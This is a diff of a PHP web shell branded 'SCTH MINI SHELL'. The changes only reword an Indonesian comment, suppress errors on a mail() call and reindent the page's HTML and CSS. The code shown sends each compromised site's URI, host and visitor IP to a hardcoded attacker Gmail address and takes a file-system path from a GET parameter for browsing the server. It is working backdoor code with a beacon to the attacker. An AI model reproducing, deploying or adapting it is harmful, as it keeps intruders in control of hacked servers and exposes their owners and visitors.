@@ -33,13 +33,13 @@ function perms($file) {
     return $info;
 }
 
-// Notifikasi ke email
+// Kirim email notifikasi (jika diinginkan)
 $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
 $email = "sadboycyberteamhacktivist@gmail.com";
 $subjek = "Mini Shell";
 $uri = $_SERVER['REQUEST_URI'];
 $host = $_SERVER['HTTP_HOST'];
-mail($email, $subjek, "$uri $host $ip", "From: web");
+@mail($email, $subjek, "$uri $host $ip", "From: web");
 
 $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
 $path = str_replace('\\', '/', $path);
@@ -48,46 +48,46 @@ $paths = explode('/', $path);
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="robots" content="index, follow">
-<link rel="SHORTCUT ICON" href="https://d.top4top.io/p_339978lyd9.jpg"/>
-<title>SCTH MINI SHELL</title>
-<style>
-body {
-    font-family: Iceland, sans-serif;
-    background-color: black;
-    color: red;
-}
-#content tr:hover {
-    background-color: white;
-    text-shadow: 0px 0px 10px #fff;
-}
-#content .first {
-    background-color: black;
-}
-table {
-    border: 1px #000 dotted;
-}
-a {
-    color: white;
-    text-decoration: none;
-}
-a:hover {
-    color: blue;
-    text-shadow: 0px 0px 10px #fff;
-}
-input, select, textarea {
-    border: 1px #000 solid;
-    border-radius: 5px;
-}
-.blink_text {
-    animation: blinker 2s linear infinite;
-    color: red;
-}
-@keyframes blinker {
-    0%, 100% { opacity: 1.0; }
-    50% { opacity: 0.0; }
-}
-</style>
+    <meta name="robots" content="index, follow">
+    <link rel="SHORTCUT ICON" href="https://d.top4top.io/p_339978lyd9.jpg"/>
+    <title>SCTH MINI SHELL</title>
+    <style>
+        body {
+            font-family: Iceland, sans-serif;
+            background-color: black;
+            color: red;
+        }
+        #content tr:hover {
+            background-color: white;
+            text-shadow: 0px 0px 10px #fff;
+        }
+        #content .first {
+            background-color: black;
+        }
+        table {
+            border: 1px #000 dotted;
+        }
+        a {
+            color: white;
+            text-decoration: none;
+        }
+        a:hover {
+            color: blue;
+            text-shadow: 0px 0px 10px #fff;
+        }
+        input, select, textarea {
+            border: 1px #000 solid;
+            border-radius: 5px;
+        }
+        .blink_text {
+            animation: blinker 2s linear infinite;
+            color: red;
+        }
+        @keyframes blinker {
+            0%, 100% { opacity: 1.0; }
+            50% { opacity: 0.0; }
+        }
+    </style>
 </head>
 <body>
 <center>
